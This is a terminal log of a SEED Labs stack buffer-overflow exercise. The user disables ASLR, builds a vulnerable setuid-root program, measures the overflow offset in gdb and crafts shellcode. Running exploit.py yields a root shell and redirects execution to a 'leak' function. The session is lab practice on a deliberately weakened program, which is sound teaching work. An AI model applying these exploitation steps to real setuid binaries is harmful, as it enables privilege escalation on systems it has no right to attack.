[06/17/22]seed@VM:~/.../yalf$ sudo sysctl -w kernel.randomize_va_space=0
kernel.randomize_va_space = 0
[06/17/22]seed@VM:~/.../yalf$ sudo ln -sf /bin/zsh /bin/sh
[06/17/22]seed@VM:~/.../yalf$ 
[06/17/22]seed@VM:~/.../yalf$ sudo su
root@VM:/home/seed/practice/leak_func/yalf# 
root@VM:/home/seed/practice/leak_func/yalf# 
root@VM:/home/seed/practice/leak_func/yalf# gcc  -m32 -o stack -z execstack -fno-stack-protector stack.c

root@VM:/home/seed/practice/leak_func/yalf# sudo chown root stack
root@VM:/home/seed/practice/leak_func/yalf# sudo chmod 4755 stack
root@VM:/home/seed/practice/leak_func/yalf# su seed
[06/17/22]seed@VM:~/.../yalf$ 
[06/17/22]seed@VM:~/.../yalf$ 
[06/17/22]seed@VM:~/.../yalf$ touch badfile
[06/17/22]seed@VM:~/.../yalf$ gcc -m32 -o stack_dbg -g -z execstack -fno-stack-protector stack.c
[06/17/22]seed@VM:~/.../yalf$ gdb stack_dbg
GNU gdb (Ubuntu 9.2-0ubuntu1~20.04) 9.2
Copyright (C) 2020 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
/opt/gdbpeda/lib/shellcode.py:24: SyntaxWarning: "is" with a literal. Did you mean "=="?
  if sys.version_info.major is 3:
/opt/gdbpeda/lib/shellcode.py:379: SyntaxWarning: "is" with a literal. Did you mean "=="?
  if pyversion is 3:
Reading symbols from stack_dbg...
gdb-peda$ b bof
Breakpoint 1 at 0x12ad: file stack.c, line 8.
gdb-peda$ 
Note: breakpoint 1 also set at pc 0x12ad.
Breakpoint 2 at 0x12ad: file stack.c, line 8.
gdb-peda$ q
[06/17/22]seed@VM:~/.../yalf$ gdb stack_dbg
GNU gdb (Ubuntu 9.2-0ubuntu1~20.04) 9.2
Copyright (C) 2020 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
/opt/gdbpeda/lib/shellcode.py:24: SyntaxWarning: "is" with a literal. Did you mean "=="?
  if sys.version_info.major is 3:
/opt/gdbpeda/lib/shellcode.py:379: SyntaxWarning: "is" with a literal. Did you mean "=="?
  if pyversion is 3:
Reading symbols from stack_dbg...
gdb-peda$ b bof
Breakpoint 1 at 0x12ad: file stack.c, line 8.
gdb-peda$ run
Starting program: /home/seed/practice/leak_func/yalf/stack_dbg 
Input size: 0
[----------------------------------registers-----------------------------------]
EAX: 0xffffd4ac --> 0x0 
EBX: 0x56558fb8 --> 0x3ec0 
ECX: 0x0 
EDX: 0x56557047 --> 0x3d3d3d00 ('')
ESI: 0xf7fb4000 --> 0x1e6d6c 
EDI: 0xf7fb4000 --> 0x1e6d6c 
EBP: 0xffffd5e8 --> 0x0 
ESP: 0xffffd48c --> 0x565563b5 (<main+162>:	add    esp,0x10)
EIP: 0x565562ad (<bof>:	endbr32)
EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x565562a4 <frame_dummy+4>:	jmp    0x56556200 <register_tm_clones>
   0x565562a9 <__x86.get_pc_thunk.dx>:	mov    edx,DWORD PTR [esp]
   0x565562ac <__x86.get_pc_thunk.dx+3>:	ret    
=> 0x565562ad <bof>:	endbr32 
   0x565562b1 <bof+4>:	push   ebp
   0x565562b2 <bof+5>:	mov    ebp,esp
   0x565562b4 <bof+7>:	push   ebx
   0x565562b5 <bof+8>:	sub    esp,0x24
[------------------------------------stack-------------------------------------]
0000| 0xffffd48c --> 0x565563b5 (<main+162>:	add    esp,0x10)
0004| 0xffffd490 --> 0xffffd4ac --> 0x0 
0008| 0xffffd494 --> 0x0 
0012| 0xffffd498 --> 0x12c 
0016| 0xffffd49c --> 0x5655a1a0 --> 0xfbad2498 
0020| 0xffffd4a0 --> 0x0 
0024| 0xffffd4a4 --> 0x0 
0028| 0xffffd4a8 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, bof (str=0xffffd4ac "") at stack.c:8
8	{
gdb-peda$ next
[----------------------------------registers-----------------------------------]
EAX: 0x56558fb8 --> 0x3ec0 
EBX: 0x56558fb8 --> 0x3ec0 
ECX: 0x0 
EDX: 0x56557047 --> 0x3d3d3d00 ('')
ESI: 0xf7fb4000 --> 0x1e6d6c 
EDI: 0xf7fb4000 --> 0x1e6d6c 
EBP: 0xffffd488 --> 0xffffd5e8 --> 0x0 
ESP: 0xffffd460 --> 0xf7fb4000 --> 0x1e6d6c 
EIP: 0x565562c2 (<bof+21>:	sub    esp,0x8)
EFLAGS: 0x216 (carry PARITY ADJUST zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x565562b5 <bof+8>:	sub    esp,0x24
   0x565562b8 <bof+11>:	call   0x565563e3 <__x86.get_pc_thunk.ax>
   0x565562bd <bof+16>:	add    eax,0x2cfb
=> 0x565562c2 <bof+21>:	sub    esp,0x8
   0x565562c5 <bof+24>:	push   DWORD PTR [ebp+0x8]
   0x565562c8 <bof+27>:	lea    edx,[ebp-0x20]
   0x565562cb <bof+30>:	push   edx
   0x565562cc <bof+31>:	mov    ebx,eax
[------------------------------------stack-------------------------------------]
0000| 0xffffd460 --> 0xf7fb4000 --> 0x1e6d6c 
0004| 0xffffd464 --> 0xf7fb4000 --> 0x1e6d6c 
0008| 0xffffd468 --> 0xffffd5e8 --> 0x0 
0012| 0xffffd46c --> 0xf7e20e09 (<printf+41>:	add    esp,0x1c)
0016| 0xffffd470 --> 0xf7fb4d20 --> 0xfbad2a84 
0020| 0xffffd474 ("8pUV\224\324\377\377")
0024| 0xffffd478 --> 0xffffd494 --> 0x0 
0028| 0xffffd47c --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
12	    strcpy(buffer, str);       
gdb-peda$ p $ebp
$1 = (void *) 0xffffd488
gdb-peda$ p *buffer
$2 = 0xe8
gdb-peda$ p &buffer
$3 = (char (*)[24]) 0xffffd468
gdb-peda$ p/d 0xffffd488 - 0xffffd468
$4 = 32
gdb-peda$ disas bof 
Dump of assembler code for function bof:
   0x565562ad <+0>:	endbr32 
   0x565562b1 <+4>:	push   ebp
   0x565562b2 <+5>:	mov    ebp,esp
   0x565562b4 <+7>:	push   ebx
   0x565562b5 <+8>:	sub    esp,0x24
   0x565562b8 <+11>:	call   0x565563e3 <__x86.get_pc_thunk.ax>
   0x565562bd <+16>:	add    eax,0x2cfb
=> 0x565562c2 <+21>:	sub    esp,0x8
   0x565562c5 <+24>:	push   DWORD PTR [ebp+0x8]
   0x565562c8 <+27>:	lea    edx,[ebp-0x20]
   0x565562cb <+30>:	push   edx
   0x565562cc <+31>:	mov    ebx,eax
   0x565562ce <+33>:	call   0x56556120 <strcpy@plt>
   0x565562d3 <+38>:	add    esp,0x10
   0x565562d6 <+41>:	mov    eax,0x1
   0x565562db <+46>:	mov    ebx,DWORD PTR [ebp-0x4]
   0x565562de <+49>:	leave  
   0x565562df <+50>:	ret    
End of assembler dump.
gdb-peda$ b *0x565562de
Breakpoint 2 at 0x565562de: file stack.c, line 15.
gdb-peda$ c
Continuing.
[----------------------------------registers-----------------------------------]
EAX: 0x1 
EBX: 0x56558fb8 --> 0x3ec0 
ECX: 0xffffd4ac --> 0x0 
EDX: 0xffffd468 --> 0xffffd500 --> 0x0 
ESI: 0xf7fb4000 --> 0x1e6d6c 
EDI: 0xf7fb4000 --> 0x1e6d6c 
EBP: 0xffffd488 --> 0xffffd5e8 --> 0x0 
ESP: 0xffffd460 --> 0xf7fb4000 --> 0x1e6d6c 
EIP: 0x565562de (<bof+49>:	leave)
EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x565562d3 <bof+38>:	add    esp,0x10
   0x565562d6 <bof+41>:	mov    eax,0x1
   0x565562db <bof+46>:	mov    ebx,DWORD PTR [ebp-0x4]
=> 0x565562de <bof+49>:	leave  
   0x565562df <bof+50>:	ret    
   0x565562e0 <foo>:	endbr32 
   0x565562e4 <foo+4>:	push   ebp
   0x565562e5 <foo+5>:	mov    ebp,esp
[------------------------------------stack-------------------------------------]
0000| 0xffffd460 --> 0xf7fb4000 --> 0x1e6d6c 
0004| 0xffffd464 --> 0xf7fb4000 --> 0x1e6d6c 
0008| 0xffffd468 --> 0xffffd500 --> 0x0 
0012| 0xffffd46c --> 0xf7e20e09 (<printf+41>:	add    esp,0x1c)
0016| 0xffffd470 --> 0xf7fb4d20 --> 0xfbad2a84 
0020| 0xffffd474 ("8pUV\224\324\377\377")
0024| 0xffffd478 --> 0xffffd494 --> 0x0 
0028| 0xffffd47c --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 2, 0x565562de in bof (str=0xffffd4ac "") at stack.c:15
15	}
gdb-peda$ disas foo
Dump of assembler code for function foo:
   0x565562e0 <+0>:	endbr32 
   0x565562e4 <+4>:	push   ebp
   0x565562e5 <+5>:	mov    ebp,esp
   0x565562e7 <+7>:	push   ebx
   0x565562e8 <+8>:	sub    esp,0x4
   0x565562eb <+11>:	call   0x565563e3 <__x86.get_pc_thunk.ax>
   0x565562f0 <+16>:	add    eax,0x2cc8
   0x565562f5 <+21>:	sub    esp,0xc
   0x565562f8 <+24>:	lea    edx,[eax-0x1fb0]
   0x565562fe <+30>:	push   edx
   0x565562ff <+31>:	mov    ebx,eax
   0x56556301 <+33>:	call   0x56556130 <puts@plt>
   0x56556306 <+38>:	add    esp,0x10
   0x56556309 <+41>:	mov    eax,0x1
   0x5655630e <+46>:	mov    ebx,DWORD PTR [ebp-0x4]
   0x56556311 <+49>:	leave  
   0x56556312 <+50>:	ret    
End of assembler dump.
gdb-peda$ disas bof
Dump of assembler code for function bof:
   0x565562ad <+0>:	endbr32 
   0x565562b1 <+4>:	push   ebp
   0x565562b2 <+5>:	mov    ebp,esp
   0x565562b4 <+7>:	push   ebx
   0x565562b5 <+8>:	sub    esp,0x24
   0x565562b8 <+11>:	call   0x565563e3 <__x86.get_pc_thunk.ax>
   0x565562bd <+16>:	add    eax,0x2cfb
   0x565562c2 <+21>:	sub    esp,0x8
   0x565562c5 <+24>:	push   DWORD PTR [ebp+0x8]
   0x565562c8 <+27>:	lea    edx,[ebp-0x20]
   0x565562cb <+30>:	push   edx
   0x565562cc <+31>:	mov    ebx,eax
   0x565562ce <+33>:	call   0x56556120 <strcpy@plt>
   0x565562d3 <+38>:	add    esp,0x10
   0x565562d6 <+41>:	mov    eax,0x1
   0x565562db <+46>:	mov    ebx,DWORD PTR [ebp-0x4]
=> 0x565562de <+49>:	leave  
   0x565562df <+50>:	ret    
End of assembler dump.
gdb-peda$ q
[06/17/22]seed@VM:~/.../yalf$ nasm -f elf32 mysh.s -o mysh.o
[06/17/22]seed@VM:~/.../yalf$ xxd -p -c 20 mysh.o
7f454c4601010100000000000000000001000300
0100000000000000000000004000000000000000
3400000000002800050002000000000000000000
0000000000000000000000000000000000000000
0000000000000000000000000000000000000000
0000000001000000010000000600000000000000
1001000009000000000000000000000010000000
0000000007000000030000000000000000000000
2001000021000000000000000000000001000000
0000000011000000020000000000000000000000
5001000040000000040000000300000004000000
1000000019000000030000000000000000000000
900100000f000000000000000000000001000000
00000000000000000000000031dbbbe0625556ff
d300000000000000002e74657874002e73687374
72746162002e73796d746162002e737472746162
0000000000000000000000000000000000000000
0000000000000000000000000100000000000000
000000000400f1ff000000000000000000000000
0300010008000000000000000000000010000100
006d7973682e73005f73746172740000
[06/17/22]seed@VM:~/.../yalf$ python3 convert.py 
Length of the shellcode: 9
shellcode= (
   "\x31\xdb\xbb\xe0\x62\x55\x56\xff\xd3"
).encode('latin-1')
[06/17/22]seed@VM:~/.../yalf$ python3 exploit.py
[06/17/22]seed@VM:~/.../yalf$ ./A1
bash: ./A1: No such file or directory
[06/17/22]seed@VM:~/.../yalf$ ./stack
Input size: 300
Segmentation fault
[06/17/22]seed@VM:~/.../yalf$ gdb stack_dbg
GNU gdb (Ubuntu 9.2-0ubuntu1~20.04) 9.2
Copyright (C) 2020 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
/opt/gdbpeda/lib/shellcode.py:24: SyntaxWarning: "is" with a literal. Did you mean "=="?
  if sys.version_info.major is 3:
/opt/gdbpeda/lib/shellcode.py:379: SyntaxWarning: "is" with a literal. Did you mean "=="?
  if pyversion is 3:
Reading symbols from stack_dbg...
gdb-peda$ b bof
Breakpoint 1 at 0x12ad: file stack.c, line 8.
gdb-peda$ run
Starting program: /home/seed/practice/leak_func/yalf/stack_dbg 
Input size: 300
[----------------------------------registers-----------------------------------]
EAX: 0xffffd4ac --> 0x90909090 
EBX: 0x56558fb8 --> 0x3ec0 
ECX: 0x0 
EDX: 0x56557047 --> 0x3d3d3d00 ('')
ESI: 0xf7fb4000 --> 0x1e6d6c 
EDI: 0xf7fb4000 --> 0x1e6d6c 
EBP: 0xffffd5e8 --> 0x0 
ESP: 0xffffd48c --> 0x565563b5 (<main+162>:	add    esp,0x10)
EIP: 0x565562ad (<bof>:	endbr32)
EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x565562a4 <frame_dummy+4>:	jmp    0x56556200 <register_tm_clones>
   0x565562a9 <__x86.get_pc_thunk.dx>:	mov    edx,DWORD PTR [esp]
   0x565562ac <__x86.get_pc_thunk.dx+3>:	ret    
=> 0x565562ad <bof>:	endbr32 
   0x565562b1 <bof+4>:	push   ebp
   0x565562b2 <bof+5>:	mov    ebp,esp
   0x565562b4 <bof+7>:	push   ebx
   0x565562b5 <bof+8>:	sub    esp,0x24
[------------------------------------stack-------------------------------------]
0000| 0xffffd48c --> 0x565563b5 (<main+162>:	add    esp,0x10)
0004| 0xffffd490 --> 0xffffd4ac --> 0x90909090 
0008| 0xffffd494 --> 0x12c 
0012| 0xffffd498 --> 0x12c 
0016| 0xffffd49c --> 0x5655a1a0 --> 0xfbad2488 
0020| 0xffffd4a0 --> 0x0 
0024| 0xffffd4a4 --> 0x0 
0028| 0xffffd4a8 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, bof (
    str=0xffffd4ac '\220' <repeats 36 times>, "\031\326\377\377", '\220' <repeats 160 times>...) at stack.c:8
8	{
gdb-peda$ disas foo
Dump of assembler code for function foo:
   0x565562e0 <+0>:	endbr32 
   0x565562e4 <+4>:	push   ebp
   0x565562e5 <+5>:	mov    ebp,esp
   0x565562e7 <+7>:	push   ebx
   0x565562e8 <+8>:	sub    esp,0x4
   0x565562eb <+11>:	call   0x565563e3 <__x86.get_pc_thunk.ax>
   0x565562f0 <+16>:	add    eax,0x2cc8
   0x565562f5 <+21>:	sub    esp,0xc
   0x565562f8 <+24>:	lea    edx,[eax-0x1fb0]
   0x565562fe <+30>:	push   edx
   0x565562ff <+31>:	mov    ebx,eax
   0x56556301 <+33>:	call   0x56556130 <puts@plt>
   0x56556306 <+38>:	add    esp,0x10
   0x56556309 <+41>:	mov    eax,0x1
   0x5655630e <+46>:	mov    ebx,DWORD PTR [ebp-0x4]
   0x56556311 <+49>:	leave  
   0x56556312 <+50>:	ret    
End of assembler dump.
gdb-peda$ disas bf
No symbol "bf" in current context.
gdb-peda$ disas bof
Dump of assembler code for function bof:
=> 0x565562ad <+0>:	endbr32 
   0x565562b1 <+4>:	push   ebp
   0x565562b2 <+5>:	mov    ebp,esp
   0x565562b4 <+7>:	push   ebx
   0x565562b5 <+8>:	sub    esp,0x24
   0x565562b8 <+11>:	call   0x565563e3 <__x86.get_pc_thunk.ax>
   0x565562bd <+16>:	add    eax,0x2cfb
   0x565562c2 <+21>:	sub    esp,0x8
   0x565562c5 <+24>:	push   DWORD PTR [ebp+0x8]
   0x565562c8 <+27>:	lea    edx,[ebp-0x20]
   0x565562cb <+30>:	push   edx
   0x565562cc <+31>:	mov    ebx,eax
   0x565562ce <+33>:	call   0x56556120 <strcpy@plt>
   0x565562d3 <+38>:	add    esp,0x10
   0x565562d6 <+41>:	mov    eax,0x1
   0x565562db <+46>:	mov    ebx,DWORD PTR [ebp-0x4]
   0x565562de <+49>:	leave  
   0x565562df <+50>:	ret    
End of assembler dump.
gdb-peda$ b *0x565562de
Breakpoint 2 at 0x565562de: file stack.c, line 15.
gdb-peda$ c
Continuing.
[----------------------------------registers-----------------------------------]
EAX: 0x1 
EBX: 0x90909090 
ECX: 0xffffd5d0 --> 0x90909090 
EDX: 0xffffd58c --> 0x90909090 
ESI: 0xf7fb4000 --> 0x1e6d6c 
EDI: 0xf7fb4000 --> 0x1e6d6c 
EBP: 0xffffd488 --> 0x90909090 
ESP: 0xffffd460 --> 0xf7fb4000 --> 0x1e6d6c 
EIP: 0x565562de (<bof+49>:	leave)
EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x565562d3 <bof+38>:	add    esp,0x10
   0x565562d6 <bof+41>:	mov    eax,0x1
   0x565562db <bof+46>:	mov    ebx,DWORD PTR [ebp-0x4]
=> 0x565562de <bof+49>:	leave  
   0x565562df <bof+50>:	ret    
   0x565562e0 <foo>:	endbr32 
   0x565562e4 <foo+4>:	push   ebp
   0x565562e5 <foo+5>:	mov    ebp,esp
[------------------------------------stack-------------------------------------]
0000| 0xffffd460 --> 0xf7fb4000 --> 0x1e6d6c 
0004| 0xffffd464 --> 0xf7fb4000 --> 0x1e6d6c 
0008| 0xffffd468 --> 0x90909090 
0012| 0xffffd46c --> 0x90909090 
0016| 0xffffd470 --> 0x90909090 
0020| 0xffffd474 --> 0x90909090 
0024| 0xffffd478 --> 0x90909090 
0028| 0xffffd47c --> 0x90909090 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 2, 0x565562de in bof (
    str=0x90909090 <error: Cannot access memory at address 0x90909090>)
    at stack.c:15
15	}
gdb-peda$ p (*(unsigned*)($ebp+4))
$1 = 0xffffd619
gdb-peda$ q
[06/17/22]seed@VM:~/.../yalf$ python3 exploit.py
[06/17/22]seed@VM:~/.../yalf$ ./stack
Input size: 300
Segmentation fault
[06/17/22]seed@VM:~/.../yalf$ python3 exploit.py
[06/17/22]seed@VM:~/.../yalf$ ./stack
Input size: 300
Segmentation fault
[06/17/22]seed@VM:~/.../yalf$ python3 exploit.py
[06/17/22]seed@VM:~/.../yalf$ ./stack
Input size: 300
# a                                                                            
zsh: command not found: a
# exit                                                                         
[06/17/22]seed@VM:~/.../yalf$ python3 exploit.py
[06/17/22]seed@VM:~/.../yalf$ ./stack
Input size: 300
Sensiive Info Leaked 
Segmentation fault
[06/17/22]seed@VM:~/.../yalf$ 
